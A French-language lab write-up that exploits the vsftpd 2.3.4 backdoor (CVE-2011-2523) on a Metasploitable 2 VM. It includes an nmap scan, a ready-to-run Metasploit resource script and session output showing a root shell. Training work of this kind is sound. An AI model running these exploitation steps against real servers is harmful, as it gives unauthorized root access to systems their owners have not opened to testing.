# Write-up — vsftpd 2.3.4 Backdoor (Metasploitable 2, port 21)

Cible : `172.28.128.5` · CVE-2011-2523 · Résultat : shell **root** direct.

Tout ce qui suit est copier-coller direct (testé en zsh), uniquement côté 🖥 Kali — pas de
manipulation nécessaire sur la VM pour ce service.

---

## 1. Recon

```bash
nmap -sV -p 21 172.28.128.5
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

## 2. Contexte de la vulnérabilité

**CVE-2011-2523.** Entre le 30 juin et le 3 juillet 2011, l'archive source officielle de
vsftpd 2.3.4 a été remplacée par une version trafiquée sur le serveur de téléchargement du
mainteneur (compromission de la chaîne de distribution, pas une faille de code dans la
version légitime). Si le nom d'utilisateur envoyé au login FTP contient `:)`, le serveur
ouvre un **shell root** en écoute sur le port **6200**, sans authentification
supplémentaire. Metasploitable 2 embarque délibérément cette version trafiquée.

Pas de recherche d'exploit nécessaire — la faille est connue et le module Metasploit existe
déjà (`exploit/unix/ftp/vsftpd_234_backdoor`).

## 3. Exploiter

🖥 Kali — via resource script :
```bash
cat > /tmp/vsftpd.rc << 'EOF'
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.28.128.5
set RPORT 21
exploit -z
sessions -l
sessions -i 1 -c id
sessions -i 1 -c whoami
sessions -i 1 -c "uname -a"
sessions -K
exit -y
EOF
msfconsole -q -r /tmp/vsftpd.rc
```

Résultat :
```
[*] 172.28.128.5:21 - Banner: 220 (vsFTPd 2.3.4)
[+] 172.28.128.5:21 - Backdoor service has been spawned, handling...
[+] 172.28.128.5:21 - UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened (172.28.128.1:xxxxx -> 172.28.128.5:6200)

uid=0(root) gid=0(root)
root
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

Le module se charge de tout : il envoie un nom d'utilisateur contenant `:)`, attend
l'ouverture du port 6200 côté cible, puis s'y connecte automatiquement.

→ **Root direct**, sans étape d'élévation de privilèges — contrairement à `distcc` (MS1,
shell `daemon`) ou `mod_copy` (MS3, shell `www-data`), aucune ACL ni condition réseau à
satisfaire : exploitation reproductible à l'identique à chaque run, immédiate.

---

**Pour rejouer tout le scénario depuis zéro** : `./start.sh` (démarre la VM), puis
directement l'étape 3 — pas de recon approfondie ni de diagnostic nécessaire, c'est la
backdoor la plus directe du parcours.

**Suite du parcours MS2 :** UnrealIRCd (port 6667), même famille de vulnérabilité (backdoor
dans un tarball officiel compromis).
